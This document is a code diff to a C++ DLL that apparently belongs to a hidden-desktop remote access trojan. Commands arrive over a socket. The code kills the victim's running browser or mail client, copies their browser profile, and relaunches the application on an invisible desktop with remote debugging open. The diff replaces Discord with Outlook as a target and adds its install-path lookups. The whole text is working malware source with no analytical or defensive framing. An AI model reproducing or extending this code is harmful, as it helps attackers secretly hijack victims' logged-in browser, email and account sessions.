@@ -2156,7 +2156,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                               wRequestedPath == L"Opera" ||
                               wRequestedPath == L"Opera GX" ||
                               wRequestedPath == L"Brave" ||
-                              wRequestedPath == L"Discord" ||
+                              wRequestedPath == L"Outlook" ||
                               wRequestedPath == L"Thunderbird");
 
             bool isGecko = (wRequestedPath == L"Firefox" ||
@@ -2169,6 +2169,8 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     ensure_desktop();
                     if (!g_hHiddenDesktop) return;
 
+                    bool actualCopyProfile = (wRequestedPath == L"Outlook") ? false : copyProfile;
+
                     wstring exeName;
                     if (wRequestedPath == L"Google Chrome") exeName = L"chrome.exe";
                     else if (wRequestedPath == L"Microsoft Edge") exeName = L"msedge.exe";
@@ -2178,41 +2180,33 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     else if (wRequestedPath == L"Opera") exeName = L"opera.exe";
                     else if (wRequestedPath == L"Opera GX") exeName = L"opera.exe";
                     else if (wRequestedPath == L"Brave") exeName = L"brave.exe";
-                    else if (wRequestedPath == L"Discord") exeName = L"discord.exe";
+                    else if (wRequestedPath == L"Outlook") exeName = L"outlook.exe";
                     else if (wRequestedPath == L"Thunderbird") exeName = L"thunderbird.exe";
 
                     if (closeReal && !exeName.empty()) {
                         send_status("Mevcut uygulama kapatılıyor...");
                         kill_process_by_name(exeName);
-                        if (wRequestedPath == L"Discord") {
-                            kill_process_by_name(L"Update.exe");
-                        }
                         Sleep(800);
                     }
 
                     wstring exePath;
-                    if (wRequestedPath == L"Discord") {
-                        wchar_t localApp[MAX_PATH] = {0};
-                        SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localApp);
-                        fs::path discDir(wstring(localApp) + L"\\Discord");
-                        if (fs::exists(discDir)) {
-                            wstring bestAppDir;
-                            for (const auto& entry : fs::directory_iterator(discDir)) {
-                                if (entry.is_directory()) {
-                                    wstring name = entry.path().filename().wstring();
-                                    if (name.rfind(L"app-", 0) == 0) {
-                                        if (bestAppDir.empty() || name > bestAppDir) {
-                                            bestAppDir = name;
-                                        }
-                                    }
+                    if (wRequestedPath == L"Outlook") {
+                        exePath = get_app_path(L"outlook.exe");
+                        if (exePath.empty() || !fs::exists(exePath)) {
+                            vector<wstring> fallbacks = {
+                                L"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
+                                L"C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
+                                L"C:\\Program Files\\Microsoft Office\\Office16\\OUTLOOK.EXE",
+                                L"C:\\Program Files (x86)\\Microsoft Office\\Office16\\OUTLOOK.EXE",
+                                L"C:\\Program Files\\Microsoft Office\\Office15\\OUTLOOK.EXE",
+                                L"C:\\Program Files (x86)\\Microsoft Office\\Office15\\OUTLOOK.EXE"
+                            };
+                            for (const auto& fb : fallbacks) {
+                                if (fs::exists(fb)) {
+                                    exePath = fb;
+                                    break;
                                 }
                             }
-                            if (!bestAppDir.empty()) {
-                                exePath = discDir.wstring() + L"\\" + bestAppDir + L"\\Discord.exe";
-                            }
-                        }
-                        if (exePath.empty() || !fs::exists(exePath)) {
-                            exePath = wstring(localApp) + L"\\Discord\\Update.exe";
                         }
                     } else if (wRequestedPath == L"Opera") {
                         wchar_t localApp[MAX_PATH] = {0};
@@ -2302,7 +2296,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
 
                         profilePath = tempProfileRoot;
 
-                    } else if (copyProfile) {
+                    } else if (actualCopyProfile) {
                         wstring sourceUserData = get_browser_profile_path(wRequestedPath);
 
                         if (sourceUserData.empty() || !fs::exists(sourceUserData)) {
@@ -2347,7 +2341,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         profilePath = tempProfileRoot;
                     }
 
-                    if (!isGecko && !copyProfile && (wRequestedPath == L"Opera" || wRequestedPath == L"Opera GX")) {
+                    if (!isGecko && !actualCopyProfile && (wRequestedPath == L"Opera" || wRequestedPath == L"Opera GX")) {
                         wchar_t tempPath[MAX_PATH];
                         GetTempPathW(MAX_PATH, tempPath);
                         wstring tempProfileRoot = tempPath;
@@ -2402,9 +2396,11 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                                 L" --disable-renderer-backgrounding"
                                 L" --remote-allow-origins=*"
                                 L" --lang=en-US";
+                    } else if (wRequestedPath == L"Outlook") {
+                        args = L"";
                     } else {
                         args = L" --remote-debugging-port=9222";
-                        if (copyProfile) {
+                        if (actualCopyProfile) {
                             args += L" --user-data-dir=\"" + profilePath + L"\"";
                             args += L" --profile-directory=\"" + profileDir + L"\"";
                         }
